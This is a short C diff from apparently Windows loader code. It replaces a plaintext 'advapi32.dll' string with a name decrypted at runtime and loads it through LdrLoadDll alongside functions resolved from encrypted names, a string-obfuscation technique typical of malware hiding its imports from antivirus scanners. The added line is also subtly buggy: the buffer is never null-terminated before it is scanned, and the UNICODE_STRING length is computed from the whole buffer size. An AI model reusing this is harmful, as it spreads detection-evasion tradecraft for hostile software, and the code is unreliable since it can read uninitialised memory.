@@ -76,7 +76,7 @@ static void *load_advapi32_via_ldr(void)
     if (adv) return adv;
     FnLdrLoadDll ldr = (FnLdrLoadDll)resolve_fn_enc(ntdll, enc_LdrLoadDll, ENC_LDRLOADDLL_LEN);
     if (!ldr) return NULL;
-    static const WCHAR dllname[] = L"advapi32.dll";
+    char narrow[32]; enc_decrypt(enc_advapi32, ENC_ADVAPI32_LEN, narrow); WCHAR dllname[32]; for (int _i = 0; narrow[_i] && _i < 31; _i++) dllname[_i] = (WCHAR)narrow[_i]; { int _dl = 0; while (dllname[_dl]) _dl++; dllname[_dl++]=L'.'; dllname[_dl++]=L'd'; dllname[_dl++]=L'l'; dllname[_dl++]=L'l'; dllname[_dl]=L'\0'; }
     UNICODE_STRING us;
     us.Length = (USHORT)(sizeof(dllname) - sizeof(WCHAR));
     us.MaximumLength = (USHORT)sizeof(dllname);
